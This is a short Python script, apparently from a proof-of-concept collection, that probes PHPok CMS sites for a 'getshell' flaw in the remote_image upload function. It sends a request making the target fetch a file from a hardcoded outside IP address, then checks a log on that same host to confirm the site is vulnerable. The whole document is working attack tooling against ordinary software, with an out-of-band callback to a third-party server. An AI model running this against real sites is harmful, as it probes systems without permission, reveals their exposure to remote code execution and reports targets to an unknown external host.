#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpok remote_image getshell漏洞
referer: http://0day5.com/archives/1820/
author: Lucifer
description: remote_image_f函数没对远程文件后缀做检查直接保存到本地。
'''
import sys
import time
import hashlib
import datetime
import requests
import warnings
def run(url):
        result = ['phpok remote_image getshell漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        time_stamp = time.mktime(datetime.datetime.now().timetuple())
        m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
        md5_str = m.hexdigest()
        payload = "/index.php?c=ueditor&f=remote_image&upfile=http://45.76.158.91:6868/" + md5_str
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            eye_url = "http://45.76.158.91/web.log"
            time.sleep(6)
            reqr = requests.get(eye_url, headers=headers, timeout=10, verify=False)
            if md5_str in reqr.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
